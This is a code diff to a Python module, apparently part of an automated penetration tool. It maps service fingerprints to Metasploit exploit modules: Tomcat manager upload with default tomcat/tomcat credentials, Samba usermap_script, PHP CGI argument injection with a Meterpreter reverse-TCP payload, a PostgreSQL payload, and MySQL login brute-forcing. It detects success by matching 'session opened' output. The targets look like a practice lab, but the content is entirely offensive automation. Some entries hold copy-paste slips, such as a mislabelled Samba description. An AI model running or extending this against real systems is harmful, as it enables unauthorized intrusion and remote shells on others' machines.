@@ -23,6 +23,19 @@ class Vulnerability():
         else: self.canCheck = True
         if "outputPatternMatch" in classDict: self.outputPatternMatch = classDict["outputPatternMatch"]
         else: self.outputPatternMatch = None
+        # will this exploit get us a list of usernames to use
+        if "addUserNames" in classDict: self.addUserNames = classDict["addUserNames"]
+        else: self.addUserNames = False
+
+        # run options for the module
+        if "options" in classDict:
+            options = classDict["options"]
+            self.options = dict()
+            for (key,value) in options:
+                self.options[key] = value
+        else:
+            self.options = None
+
         self.session = None # TODO: create a method to set and get this
 
 
@@ -92,4 +105,91 @@ _smtpScannerDict = {
     } 
 _smtpScanner= Vulnerability(_smtpScannerDict)
 
-vulnerabilities = [_ircd, _distcc, _vsftpd, _smtpScanner]
+_mysqlBruteForceDict = {
+    "keywords": "",
+    "optionalKeywords": "3306,mysql,Support41Auth",
+    "minOptionalKeyTermsThatMustMatch": 2,
+    "caseSensitiveKeyTermMatch": True,
+    "moduleName": "scanner/mysql/mysql_login",
+    "description": "SQL login spam",
+    "exploitType": "auxiliary",
+    "payload": None,
+    "outputPatternMatch": "MYSQL - Success: .*", # TODO: check this
+    "addUserNames": True,
+    "maxRuntime": 10000,
+    # "options": [("ANONYMOUS_LOGIN", True),
+    #             ("BLANK_PASSWORDS", True)]
+                # ,
+                # ("DB_ALL_USERS", True),
+                # ("USER_AS_PASS", True),
+                # ("VERBOSE", True),
+                # ("USER_FILE", "USERNAMES.txt"),
+                # ("PASS_FILE", "PASSWORDS.txt")]
+    }
+_mysqlBruteForce = Vulnerability(_mysqlBruteForceDict)
+
+_tomcatDict = {
+    "keywords": "Apache Tomcat/Coyote JSP engine 1.1",
+    "optionalKeywords": "8180,http,Apache Tomcat/Coyote JSP engine 1.1",
+    "minOptionalKeyTermsThatMustMatch": 2,
+    "caseSensitiveKeyTermMatch": True,
+    "moduleName": "multi/http/tomcat_mgr_upload",
+    "description": "Port 8180 Apache Tomcat Exploit",
+    "exploitType": "exploit",
+    "payload": None,
+    "outputPatternMatch": "Meterpreter session [0-9]* opened.*",  # TODO: check this
+    "addUserNames": True,
+    "maxRuntime": 10000,
+    "options": [("HttpPassword", "tomcat"),
+                ("HttpUsername", "tomcat"),
+                ("RPORT", "8180")]
+    }
+_tomcatDict = Vulnerability(_tomcatDict)
+
+_sambaDict = {
+    "keywords": "netbios-ssn",
+    "optionalKeywords": "139,445,netbios-ssn,Samba smbd 3.X - 4.X (workgroup: WORKGROUP)",
+    "minOptionalKeyTermsThatMustMatch": 2,
+    "caseSensitiveKeyTermMatch": True,
+    "moduleName": "multi/samba/usermap_script",
+    "description": "Port 8180 Apache Tomcat Exploit",
+    "exploitType": "exploit",
+    "payload": None,
+    "outputPatternMatch": "shell session [0-9]* opened.*",  # TODO: check this
+    "addUserNames": True,
+    "maxRuntime": 20
+    }
+_sambaDict = Vulnerability(_sambaDict)
+
+_apacheDict = {
+    "keywords": "Apache httpd 2.2.8 ((Ubuntu) DAV/2)",
+    "optionalKeywords": "80,http,Apache httpd 2.2.8 ((Ubuntu) DAV/2)",
+    "minOptionalKeyTermsThatMustMatch": 2,
+    "caseSensitiveKeyTermMatch": True,
+    "moduleName": "multi/http/php_cgi_arg_injection",
+    "description": "Apache (CGI Argument Injection)",
+    "exploitType": "exploit",
+    "payload": None,
+    "outputPatternMatch": "Meterpreter session [0-9]* opened.*",
+    "addUserNames": True,
+    "maxRuntime": 10000,
+    "options": [("PAYLOAD", "php/meterpreter/reverse_tcp")]
+    }
+_apacheDict = Vulnerability(_apacheDict)
+
+_postgresDict = {
+    "keywords": "postgresql",
+    "optionalKeywords": "5432,postgresql,PostgreSQL DB 8.3.0 - 8.3.7",
+    "minOptionalKeyTermsThatMustMatch": 2,
+    "caseSensitiveKeyTermMatch": True,
+    "moduleName": "linux/postgres/postgres_payload",
+    "description": "Exploiting Port 5432 (Postgres)",
+    "exploitType": "exploit",
+    "payload": None,
+    "outputPatternMatch": "Meterpreter session [0-9]* opened.*",
+    "addUserNames": True,
+    "maxRuntime": 20
+    }
+_postgresDict = Vulnerability(_postgresDict)
+
+vulnerabilities = [_ircd, _distcc, _vsftpd, _smtpScanner, _tomcatDict, _sambaDict, _apacheDict, _postgresDict]
